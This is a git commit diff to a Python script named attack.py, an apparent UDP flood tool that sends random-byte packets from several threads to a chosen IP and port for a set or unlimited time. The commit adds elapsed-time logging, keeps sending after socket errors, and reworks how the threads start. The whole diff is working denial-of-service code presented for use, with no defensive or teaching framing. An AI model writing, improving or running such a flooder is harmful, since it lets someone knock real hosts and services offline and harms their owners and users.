25ab8f67cf36769c1b7a1dd10cbe326f7e76e376
floordiv <pavloromanenko25@gmail.com>
2020-04-20 22:10:03 +0300

    updated threads

--- attack.py
+++ attack.py
@@ -4,6 +4,7 @@ import time
 import socket
 import random
 from threading import Thread
+from datetime import datetime
 
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -16,22 +17,26 @@ config = {
     'timeout': 0,
     'threads': 10,
     'total_packets_sent': 0,
-    'total_bytes_sent': 0
+    'total_bytes_sent': 0,
+    'begin': time.time()
 }
 
 
 def start():
-    begin = time.time()
     try:
-        while config['duration'] == 'inf' or begin + int(config['duration']) > time.time():
-            sock.sendto(random._urandom(int(config['packet-len'])), (config['ip'], int(config['port'])))
+        while config['duration'] == 'inf' or config['begin'] + int(config['duration']) > time.time():
+            try:
+                sock.sendto(random._urandom(int(config['packet-len'])), (config['ip'], int(config['port'])))
+            except OSError:
+                continue
             config['total_packets_sent'] += 1
             config['total_bytes_sent'] += int(config['packet-len'])
-            print('Sent {packets} packets to {ip}:{port}. Bytes sent: {total_packets_len}'.format(
-                                                                                            packets=config['total_packets_sent'],
-                                                                                            ip=config['ip'],
-                                                                                            port=config['port'],
-                                                                                            total_packets_len=config['total_bytes_sent']))
+            print('[{time_went} SECS] Sent {packets} packets to {ip}:{port}. Bytes sent: {total_packets_len}'.format(
+                                                                        packets=config['total_packets_sent'],
+                                                                        ip=config['ip'],
+                                                                        port=config['port'],
+                                                                        total_packets_len=config['total_bytes_sent'],
+                                                                        time_went=int(time.time() - config['begin'])))
             time.sleep(int(config['timeout']))
     except BrokenPipeError:
         print('[ERROR] Router has closed the connection')
@@ -56,8 +61,15 @@ if __name__ == '__main__':
         print('[ERROR] Missing value for --' + arg)
 
     try:
+        config['begin'] = time.time()
+
+        threads = []
+
         for _ in range(int(config['threads'])):
-            Thread(target=start).start()
+            threads.append(Thread(target=start))
+
+        for thread in threads:
+            thread.start()
     except KeyboardInterrupt:
         print('\nQuit')
         os.abort()
